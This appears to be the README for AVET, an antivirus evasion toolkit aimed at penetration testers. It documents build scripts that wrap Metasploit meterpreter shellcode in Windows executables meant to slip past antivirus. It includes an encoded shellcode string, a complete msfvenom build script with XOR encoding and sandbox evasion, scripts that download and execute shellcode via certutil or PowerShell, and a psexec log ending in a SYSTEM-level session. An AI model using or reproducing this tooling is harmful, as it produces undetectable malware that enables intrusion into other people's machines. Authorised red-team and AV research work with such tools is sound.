AntiVirus Evasion Tool
======================

AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques.
A lot of things are new in Version 2, for a complete overview have a look at the CHANGELOG file.

Some of the changes in Version 2:
- internal mechanisms for bulding the executable have been rewritten, new features can be added much easier now
- https://github.com/govolution/bfg has been integrated

With the new architecture and features you can now build an executable that is loading an encrypted .exe file via network or file, receiving the key also via network or file, then decrypt in memory and then injected via process hollowing. The same applies also for other payloads like shellcode or dlls and other techniques.

What & Why:
- when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
- avet is a antivirus evasion tool targeting windows machines with executable files
- different kind of payloads can be used now, shellcode, exe and dlls
- above evasion techniques more techniques can be used now, such as shellcode injection, process hollowing and more
- most payloads can be deliverd from a file, the network or sometimes the cmd
- the payload can be encrypted with a key, the key can be delivered like payloads
- this readme applies for Kali 2018.x (64bit) and tdm-gcc

Installation
------------

You can use the setup script:
```
./setup.sh
```
TODO: rewrite setup.sh?

This will automatically get you started by installing/configuring wine, installing tdm-gcc and compiling the relevant AVET executables.
You'll shortly have to click through the tdm-gcc installer GUI though - standard settings should be fine.


If for whatever reason you want to do things manually:

How to install tdm-gcc with wine:
[https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)

Compile all the stuff
tbd

Important Note
--------------
Not all techniques will evade every AV engine. If one technique or build script does not work please test another one.

How to use 
----------

Of course it is possible to run all commands step by step from command line. In the "build" folder you will find preconfigured build scripts for relevant use cases. 
The build scripts themselves are written so as they have to be called from within the avet directory:
```
root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_50xshikata_quiet.sh
```

You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.


Build scripts
-------------
Some comments on what each script provides.
TODO: describe new scripts

```
buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
Service example for win32.

build_win32_meterpreter_rev_https_50xshikata_quiet.sh
In this example the evasion technique is simple. The shellcode is encoded with 20 rounds of 
shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This 
technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up 
execution and let the file pass. Here in quiet mode, the window is hidden.

build_win32_meterpreter_rev_https_50xshikata.sh
See previous, window not hidden.

build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
It is possible to load shellcode as a parameter from cmd like:
C:\> pwn.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlzHOrgpwpEPapLIheeaIPrDLKRp00NkV26lnkCbUDlK0r4OMg0JtfEaKONLWLe1aldBTlWPo1hOVmFa8GZBJRsbRwLKPRVplKqZ7LnkRlB1CHhc2hS1Jq3alKf9Q0GqICnkG97hhcfZaYnkttlKfaJvuayoNLZaJoFm31JgehKPaeYf4CamHx7KSM5t2UzDbxlKBxFDFaKcE6lK6lpKlKshELWqKcLKeTNkFaHPni1Ta4dd3k1KaqBy2zF1ioM0qOQOpZlKR2XkLMQMphPn3UT4uPsXqgQypnQy1DcXBlqgUvFgioZuDqKkRs0SBssccc3XFZ66RYI7KO9EaCpS0jtCf3v3SXoKva30309xKtuPs07pfOabF8rlcopdG3VUrK0n07BMVYSQE2T8ROGEPOPLphP8e7du0iqj3osISqBR0grC2tCfroef1aRU1OblRMqzd1UaBx737D1OW1dpv9fV7pv0SXv7k9mOkvYokeniXFF32HEPEbM0MT63v3bsaGaCsfSXJKV5DnWKKOiENv1zgzaOE8opp3S0wpMY9p1z3460SZGorvU8CEBfMNOvkOyE1CpSaC2spVqxVMtF7hCK9oXUNekpCE5DU8OxGcc0EPaxStZPVUM0kOjupO45xMyx0LePEPWp1zspQxWpR0uPS0u8c030aPc0bs3X68i42sHeioiENs2sBsOyHgrwqxEPa0eP30v3V6cXuBofNiZByo8UmUIP448ONkFg5QO3NeKpT5Iuv8O3CojHrKYo9oyop1DyEbFNfQtvGHVNDqUafVDnubDpuhUPoKxpH5i2sf2JC0sc9ohUAA

build_win32_meterpreter_rev_https_ASCIIMSF.sh

build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
AV evasion with the fopen technique, hidden window.

build_win32_meterpreter_rev_https_fopen_shikata.sh
See previous example.

build_win32_meterpreter_rev_https_killswitch_shikata.sh
AV evasion with the killswitch technique.

build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
Download a shellcode with the certutil.exe command and exec the shellcode.

build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
Like build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh, but also builds the
payload with DKMC, a tool by https://github.com/mrun1k0d3r.
For more: https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/

build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
This one downloads a shellcode from a webserver into memory and executes the shellcode.

build_win32_meterpreter_rev_https_shikata_download_powershell_raw_loadfile.sh
Download a shellcode with a powershell command and exec the shellcode.

build_win32_meterpreter_rev_https_shikata_fopen.sh
Sandbox evasion with fopen and additional encoding

build_win32_meterpreter_rev_https_shikata_loadfile.sh
Loading and exec shellcode from given file, needs avets encoding.

build_win32_meterpreter_rev_https_shikata_load_ie.sh
This is a bit tricky and might not work on the first shot. The executable will start Internet Explorer and download the ASCII encoded shellcode. Then the shellcode will be read from the cache directory and if found executed. This was tested with Windows 7 only.

build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
Same as before with debug output.

build_win32_meterpreter_rev_https_shikata_raw_loadfile.sh
Example for loading raw shellcode files.

build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
Unstaged payload with dlls included. For more see https://govolution.wordpress.com/2017/05/06/avet-and-unstaged-payloads/

build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
Build this one for Kaspersky, don't know if it is still unrecognized.

build_win64_meterpreter_rev_tcp_xor_downloadexecshellcode.sh
This one downloads a shellcode from a webserver into memory and executes the shellcode.

build_win64_meterpreter_rev_tcp_xor_fopen.sh
64bit executable with fopen evasion.

build_win64_meterpreter_rev_tcp_xor.sh
64bit executable.
```

AVET & metasploit psexec
------------------------
AVET supports metasploits psexec module. The corresponding build scripts looks like:

```
#!/bin/bash          
# simple example script for building the .exe file
# for use with msf psexec module

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT

# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f raw -a x86 --platform Windows > input/sc_raw.txt

# import feature construction interface
. build/feature_construction.sh

# add evasion techniques
add_evasion fopen_sandbox_evasion
add_evasion gethostbyname_sandbox_evasion
printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include

# generate key file
generate_key preset aabbcc12de input/key_raw.txt

# encode shellcode
encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source none

# set decoder
set_decoder xor

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# enable debug printing
enable_debug_print to_file C:/avetdbg.txt

# compile as service
$win32_compiler -o output/service.exe source/avetsvc.c -lws2_32
strip output/service.exe

# cleanup
cleanup_techniques

```

And on the metasploit site:
```
msf exploit(psexec) > use exploit/windows/smb/psexec
msf exploit(psexec) > set EXE::custom /root/tools/ave/pwn.exe
EXE::custom => /root/tools/ave/pwn.exe
msf exploit(psexec) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(psexec) > set rhost 192.168.116.183
rhost => 192.168.116.183
msf exploit(psexec) > set smbuser dax
smbuser => dax
msf exploit(psexec) > set smbpass test123
smbpass => test123
msf exploit(psexec) > set lport 8443
lport => 8443
msf exploit(psexec) > run

[*] 192.168.116.183:445 - Connecting to the server...
[*] Started bind handler
[*] 192.168.116.183:445 - Authenticating to 192.168.116.183:445 as user 'dax'...
[*] Sending stage (957487 bytes) to 192.168.116.183
[*] 192.168.116.183:445 - Selecting native target
[*] 192.168.116.183:445 - Uploading payload...
[*] 192.168.116.183:445 - Using custom payload /root/tools/avepoc/a.exe, RHOST and RPORT settings will be ignored!
[*] 192.168.116.183:445 - Created \mzrCIOVg.exe...
[+] 192.168.116.183:445 - Service started successfully...
[*] 192.168.116.183:445 - Deleting \mzrCIOVg.exe...
[-] 192.168.116.183:445 - Delete of \mzrCIOVg.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)
[*] Exploit completed, but no session was created.
msf exploit(psexec) > [*] Meterpreter session 4 opened (192.168.116.142:33453 -> 192.168.116.183:8443) at 2017-05-27 18:47:23 +0200

msf exploit(psexec) > sessions

Active sessions
===============

Id Type Information Connection
-- ---- ----------- ----------
4 meterpreter x86/windows NT-AUTORIT_T\SYSTEM @ DAX-RYMZ48Z3EYO 192.168.116.142:33453 -> 192.168.116.183:8443 (192.168.116.183)

msf exploit(psexec) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer : DAX-RYMZ48Z3EYO
OS : Windows XP (Build 2600, Service Pack 3).
Architecture : x86
System Language : de_DE
Domain : ARBEITSGRUPPE
Logged On Users : 2
Meterpreter : x86/windows
```


TODO: Rewrite fabric section
**However, it is strongly recommended to use the avet_fabric.py! It makes the tool easier to use.**

The fabric provides a more convenient interface on the command line, where you can choose which build script you want to use.
It also gives you the opportunity to alter build scripts on the fly (see below).

The latter is especially useful as you can define new LHOST and LPORT variables for msfvenom each time you run a build script via the fabric.
You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.

Here's a quick example (python3 || gtfo):
```
python3 avet_fabric.py 

                       .|        ,       +
             *         | |      ((             *
                       |'|       `    ._____
         +     ___    |  |   *        |.   |' .---"|
       _    .-'   '-. |  |     .--'|  ||   | _|    |
    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
    |' | |.    |    ||       | |   |  |    ||      |
 ___|  '-'     '    ""       '-'   '-.'    '`      |____
jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

AVET Fabric by Daniel Sauder

avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.

0: build_win32_meterpreter_rev_https_shikata_fopen.sh
1: build_win32_meterpreter_rev_https_fopen_shikata.sh
2: buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
3: build_win32_meterpreter_rev_https_50xshikata_quiet.sh
4: build_win32_meterpreter_rev_https_shikata_raw_loadfile.sh
5: build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
6: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
7: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
8: build_win32_meterpreter_rev_https_ASCIIMSF.sh
9: build_win32_meterpreter_rev_https_killswitch_shikata.sh
10: build_win32_meterpreter_rev_https_shikata_download_powershell_raw_loadfile.sh
11: build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
12: build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
13: build_win32_meterpreter_rev_https_50xshikata.sh
14: build_win32_meterpreter_rev_https_shikata_loadfile.sh
15: build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
16: build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
17: build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
18: build_win64_meterpreter_rev_tcp_xor.sh
19: build_win32_meterpreter_rev_https_shikata_load_ie.sh
20: build_win64_meterpreter_rev_tcp_xor_downloadexecshellcode.sh
21: build_win64_meterpreter_rev_tcp_xor_fopen.sh
Input number of the script you want use and hit enter: 0

Now you can edit the build script line by line.

simple example script for building the .exe file
include script containing the compiler var $win32_compiler
you can edit the compiler in build/global_win32.sh
or enter $win32_compiler="mycompiler" here
$ . build/global_win32.sh
import global default lhost and lport values from build/global_connect_config.sh
$ . build/global_connect_config.sh
override connect-back settings here, if necessary
$ LPORT=$GLOBAL_LPORT
$ LHOST=$GLOBAL_LHOST
make meterpreter reverse payload, encoded with shikata_ga_nai
additionaly to the avet encoder, further encoding should be used
$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
format the shellcode for make_avet
$ ./format.sh sc.txt > scclean.txt && rm sc.txt
call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion
$ ./make_avet -f scclean.txt -F -E
compile to pwn.exe file
$ $win32_compiler -o pwn.exe avet.c
cleanup
$ rm scclean.txt && echo "" > defs.h

The following commands will be executed:
#/bin/bash
. build/global_win32.sh
. build/global_connect_config.sh
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
./format.sh sc.txt > scclean.txt && rm sc.txt
./make_avet -f scclean.txt -F -E
$win32_compiler -o pwn.exe avet.c
rm scclean.txt && echo "" > defs.h

Press enter to continue.

Building the output file...

Please stand by...

The output file should be placed in the current directory.

Bye...

```


More
====
For basics about antivirus evasion, AVET & more information have a look here (most for version 1.3): 
- https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/
- https://govolution.wordpress.com/2017/06/11/avet-video/
- https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
- https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf
- https://twitter.com/DanielX4v3r
